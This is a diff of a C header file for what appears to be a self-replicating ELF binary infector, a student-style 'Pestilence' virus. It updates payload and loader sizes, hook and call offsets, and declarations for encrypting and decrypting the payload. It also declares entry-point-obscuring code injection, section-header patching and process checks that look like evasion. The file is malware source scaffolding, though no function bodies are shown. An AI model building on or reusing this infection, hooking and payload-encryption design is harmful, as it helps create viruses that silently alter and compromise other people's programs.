@@ -11,6 +11,7 @@
 # include <sys/stat.h>
 # include <fcntl.h>
 # include <limits.h>
+# include <signal.h>
 
 # define KEY 0x62F98A47
 # define SUB 0x95837523
@@ -21,29 +22,29 @@
 # define BUF_SIZE 0x20
 # define BIS_SIZE 0x1db
 # define LOADER_SIZE 0xca
-# define PAYLOAD_SIZE 0x3f4a - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x3dc1 - FT_MEMCPY_ADDR
+# define PAYLOAD_SIZE 0x4343 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x41ba - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + SIGN_SIZE + 8
 
-# define OFFSET_1 0x3499 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_2 0x341c + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_3 0x34db + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_4 0x3dcc + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_1 0x3892 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_2 0x3815 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_3 0x38d4 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_4 0x41c5 + BIS_SIZE - FT_MEMCPY_ADDR
 # define OFFSET_5 0x161c + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_6 0x3cc0 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_7 0x3700 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_RIP 0x3ccf - FT_MEMCPY_ADDR
+# define OFFSET_6 0x40b9 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_7 0x3af9 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_RIP 0x40c8 - FT_MEMCPY_ADDR
 
-# define OFFSET_HOOK_1 0x3cea + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_1 0x3ce0 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_2 0x3d17 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_2 0x3d0d + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_3 0x3d44 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_3 0x3d3a + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_4 0x3d71 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_4 0x3d67 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_5 0x3d9e + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_5 0x3d94 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_1 0x40e3 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_1 0x40d9 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_2 0x4110 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_2 0x4106 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_3 0x413d + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_3 0x4133 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_4 0x416a + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_4 0x4160 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_5 0x4197 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_5 0x418d + BIS_SIZE - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
@@ -64,6 +65,8 @@ typedef struct		s_info
 
 	int32_t		valid_target;
 	int32_t		in_pestilence;
+
+	size_t		tab_addr[12];
 }					t_info;
 
 typedef struct		s_fingerprint
@@ -112,12 +115,13 @@ void		double_ret();
 uint32_t	get_key_func(int nb);
 
 /*			**** CRYPTO ****				*/
-uint32_t	encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint);
-uint32_t	hash_loader(t_info *info);
 void		patch_key(t_info *info, uint32_t key);
+uint32_t	hash_loader(t_info *info);
+uint32_t        hash_func(void *addr, size_t size, uint32_t hash);
+uint32_t	encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint);
 void		crypt_payload(t_info *info, uint32_t fingerprint);
 uint32_t        encrypt_func(void *addr, size_t size, uint32_t key);
-uint32_t        decrypt_func(t_info *info, void *addr, size_t size, uint32_t key);
+uint32_t        decrypt_func(t_info *info, void *addr, size_t size, uint32_t nb);
 void            reencrypt_func(t_info *info, void *addr, size_t size, uint32_t key);
 
 /*			**** PATCH ****					*/
@@ -127,9 +131,17 @@ void		patch_payload(t_info *info);
 void		patch_loader(t_info *info, uint32_t hash);
 
 /*			**** PARSING ****				*/
+int             update_index(t_fingerprint *fingerprint, t_info *info);
+int             check_magic(t_info *info, t_fingerprint *fingerprint);
+size_t          get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_hp);
+int             valid_call(t_info *info, int pos);
+void            patch_sections_header(t_info *info, size_t offset, size_t to_add);
 int		find_text(t_info *info, t_fingerprint *fingerprint);
+void            hook_call(t_info *info, int32_t nb);
+void            patch_close_entries(t_info *info, int32_t nb);
 void		epo_parsing(t_info *info);
 int		pe_parsing(t_info *info);
+int             parse_process(char *path, int pid_len, char *buf_inhibitor);
 void		patch_bis(t_info *info, int32_t nb);
 int		check_process(char *buf_path);
 void		mprotect_text(int prot);
